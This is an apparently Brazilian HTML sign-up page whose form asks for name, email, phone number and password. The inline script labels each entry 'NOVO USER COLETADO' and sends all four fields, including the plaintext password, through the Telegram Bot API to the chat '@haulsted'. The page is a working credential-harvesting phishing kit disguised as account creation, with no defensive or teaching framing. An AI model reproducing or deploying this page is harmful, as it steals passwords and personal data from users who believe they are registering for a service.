<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Document</title>
</head>
<body>
    <img class="back" src="back.png">
    <form class="signup" action="javascript:submit()">
        <img class="logo" src="logo.png">
        <label>Nome</label>
        <input type="text" id="name" required/>
        <label>Email</label>
        <input type="email" id="email" required/>
        <label>Número</label>
        <input type="tel" id="number" value="+55" required/>
        <label>Senha</label>
        <div class="pass">
        <input type="password" id="pass" required/>
            <svg onclick="pass()" fill="none" height="100%" viewBox="0 0 24 24" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M15.18 12c0 1.76-1.42 3.18-3.18 3.18-1.76 0-3.18-1.42-3.18-3.18 0-1.76 1.42-3.18 3.18-3.18 1.76 0 3.18 1.42 3.18 3.18Z" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"></path><path d="M12 19.5c3.45 0 6.63-2.28 8.67-6.16.44-.83.44-1.85 0-2.68C18.63 6.78 15.45 4.5 12 4.5s-6.63 2.28-8.67 6.16c-.44.83-.44 1.85 0 2.68C5.37 17.22 8.55 19.5 12 19.5Z" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"></path></svg>
            </div>
        <button>Criar conta</button>
    </form>
<script>  function submit() {
    // Captura os dados do formulário
    const nome = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const numero = document.getElementById("number").value;
    const senha = document.getElementById("pass").value;

    // Cria a mensagem no formato desejado
    const mensagem = `
      NOVO USER COLETADO ✅
      NOME: ${nome}
      EMAIL: ${email}
      NÚMERO: ${numero}
      SENHA: ${senha}
    `;

    // Token do bot e ID do chat (o ID deve ser do chat com @haulsted)
    const botToken = "SEU_BOT_TOKEN";
    const chatId = "@haulsted";

    // Envia a mensagem ao Telegram via API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensagem
      })
    })
    .then(response => {
      if (response.ok) {
        alert("Dados enviados com sucesso!");
      } else {
        alert("Erro ao enviar dados.");
      }
    })
    .catch(error => {
      alert("Erro de conexão: " + error);
    });
  }

  // Adiciona o evento de envio do formulário
  document.querySelector(".signup").addEventListener("submit", function(event) {
    event.preventDefault(); // Impede o envio padrão do formulário
    submit(); // Chama a função submit()
  });
    function pass() { const passwordInput = document.getElementById("pass"); if (passwordInput.type === "password") { passwordInput.type = "text"; } else { passwordInput.type = "password"; } } </script>
</body>
</html>
